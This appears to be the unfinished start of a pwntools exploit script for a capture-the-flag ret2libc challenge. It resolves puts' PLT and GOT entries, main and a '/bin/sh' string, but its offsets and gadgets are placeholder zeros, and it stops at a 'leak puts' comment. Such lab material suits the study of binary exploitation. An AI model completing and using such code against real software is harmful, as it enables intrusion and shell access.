#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./ret2libc_leak', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

OFFSET_TO_RIP = 0

POP_RDI   = 0
RET       = 0
PUTS_PLT  = elf.plt['puts']
PUTS_GOT  = elf.got['puts']
MAIN      = elf.sym['main']
BINSH     = next(elf.search(b'/bin/sh\x00'))

p = process(elf.path)

print(f"puts on goat:{hex(PUTS_GOT)}")

# -------- Stage 1: leak puts --------

